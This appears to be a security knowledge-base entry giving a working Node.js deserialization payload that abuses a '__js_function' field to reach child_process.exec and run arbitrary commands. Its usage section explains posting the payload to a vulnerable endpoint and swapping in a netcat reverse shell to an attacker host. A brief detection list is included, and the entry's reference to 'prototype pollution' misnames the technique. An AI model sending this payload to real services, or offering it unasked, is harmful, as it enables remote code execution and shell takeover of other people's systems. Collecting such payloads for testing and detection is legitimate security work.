---
type: code
language: js
verified: true
platforms:
  - Node.js
tags:
  - payload
  - rce
  - deserialization
validated: true
---

# Node-JS-Deserialization-RCE-Payload

## Code

```js
{"rce":{"__js_function":"function(){CMD=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()"}}
```

## Description

This JavaScript code is a serialized JSON payload designed for Node.js deserialization exploits. It uses the __js_function prototype pollution technique to execute arbitrary commands via child_process.exec when deserialized by a vulnerable application. The example runs 'cmd /c calc' on Windows, but can be modified for other commands.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| CMD | The shell command to execute | "cmd /c calc" or "/bin/sh -i" |

## Usage

Save this as a JSON file (e.g., payload.json) and POST it to a vulnerable deserialization endpoint using tools like curl. This payload is generated or inspired by Funcster and targets applications using unsafe deserialization libraries. Modify CMD for different effects, such as reverse shells: replace with 'nc -e /bin/sh $ATTACKER_IP $ATTACKER_PORT'.

## Detection

- Monitor for anomalous child_process.exec calls in Node.js logs.
- WAF rules for JSON payloads containing '__js_function' or base64-encoded gadgets.
- Process monitoring for unexpected executions (e.g., calc.exe spawning from web processes).
- Network callbacks if payload includes reverse shell commands.

## Related

- [[procedures/Node-Deserialization-Exploit-using-Funcster]]
- [[tools/Funcster]]
